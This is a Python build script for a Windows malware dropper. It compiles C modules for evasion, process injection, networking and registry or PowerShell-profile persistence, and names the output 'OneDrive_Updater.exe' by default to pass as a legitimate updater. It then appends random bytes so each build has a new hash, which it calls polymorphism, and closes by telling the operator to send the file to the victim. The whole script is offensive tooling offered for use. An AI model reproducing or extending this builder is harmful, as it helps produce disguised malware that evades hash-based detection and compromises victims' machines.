import os
import subprocess
import random
import hashlib
import argparse

def get_sha256(filepath):
    sha256_hash = hashlib.sha256()
    with open(filepath, "rb") as f:
        for byte_block in iter(lambda: f.read(4096), b""):
            sha256_hash.update(byte_block)
    return sha256_hash.hexdigest()

# --- setup parser
parser = argparse.ArgumentParser(description="Builder and Mutator for the C Dropper")
parser.add_argument("--name", type=str, default="OneDrive_Updater.exe", help="Name of the final generated executable")
parser.add_argument("--debug", action="store_true", help="Compile in debug mode (shows the terminal window)")
parser.add_argument("--persistence", type=str, choices=["ps", "reg"], default="reg", help="Select persistence method: PowerShell Profile (ps) or Windows Registry (reg)")
parser.add_argument("--test", action="store_true", help="Bypass anti-analysis checks for testing in a VM")
args = parser.parse_args()

print("[*] 1. Compiling C code...")

#select file based on arg
persistence_file = "persistence_ps.c" if args.persistence == "ps" else "persistence_reg.c"
print(f"[*] Persistence Module Selected: {persistence_file}")

# get absolute paths
script_dir = os.path.dirname(os.path.abspath(__file__))
project_root = os.path.abspath(os.path.join(script_dir, ".."))
code_dir = os.path.join(project_root, "src")
build_dir = os.path.join(project_root, "build")

os.makedirs(build_dir, exist_ok=True)

# output files saved in the project root/build
compiled_exe = os.path.join(project_root, "compiled.exe")
final_name = args.name
final_exe = os.path.join(build_dir, final_name)

# Comando base di compilazione
compile_cmd = [
    "x86_64-w64-mingw32-gcc",
    os.path.join(code_dir, "evasion.c"),
    os.path.join(code_dir, "injection.c"),
    os.path.join(code_dir, "network.c"),
    os.path.join(code_dir, persistence_file),
    os.path.join(code_dir, "main.c"),
    "-o", compiled_exe,
    "-s"           # stripped flag
]

if not args.debug:
    compile_cmd.append("-mwindows")
else:
    print("[!] DEBUG MODE activated: The terminal window will be visible.")
    compile_cmd.append("-DDEBUG")

# if --test flag, GCC defines TEST_MODE
if args.test:
    print("[!] TEST MODE activated: Anti-analysis features will be bypassed in compilation.")
    compile_cmd.append("-DTEST_MODE")

subprocess.run(compile_cmd, check=True)
base_hash = get_sha256(compiled_exe)
print(f"[+] Completed! Original Hash: {base_hash}")

print("\n[*] 2. Applying Polymorphism...")
with open(compiled_exe, "rb") as f:
    exe_content = f.read()

# generate 16 to 64 random bytes
junk_size = random.randint(16, 64)
junk_bytes = os.urandom(junk_size)

mutated_content = exe_content + junk_bytes

with open(final_exe, "wb") as f:
    f.write(mutated_content)

final_hash = get_sha256(final_exe)
print(f"[+] Generated Payload: {final_exe}")
print(f"[+] New SHA-256 Hash: {final_hash}")

# cleanup
os.remove(compiled_exe)
print(f"\n[+] Operation completed. Send '{final_name}' to victim!")